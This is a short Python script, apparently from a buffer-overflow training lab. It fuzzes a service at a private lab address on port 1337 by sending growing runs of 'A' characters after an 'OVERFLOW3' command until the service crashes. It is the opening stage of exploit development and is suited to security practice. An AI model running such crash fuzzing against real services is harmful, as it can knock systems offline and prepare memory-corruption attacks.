#!/usr/bin/python

import socket, time, sys

ip = "10.10.189.143"
port = 1337
timeout = 5
prefix = "OVERFLOW3 "
string = prefix + "A" * 100

while True:
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(timeout)
			s.connect((ip, port))
			s.recv(1024)
			my_bytes = len(string) - len(prefix)
			print(f"Fuzzin with {my_bytes} bytes") #.format(len(string) - len(prefix)))
			#my_bytes = len(string) - len(prefix)
			s.send(bytes(string, "latin-1"))
			s.recv(1024)
	except Exception as e:
		print(e)
		print("Fuzin crashed at {} bytes".format(len(string) - len(prefix)))
		sys.exit(0)
	string += 100 * "A"
	time.sleep(1)
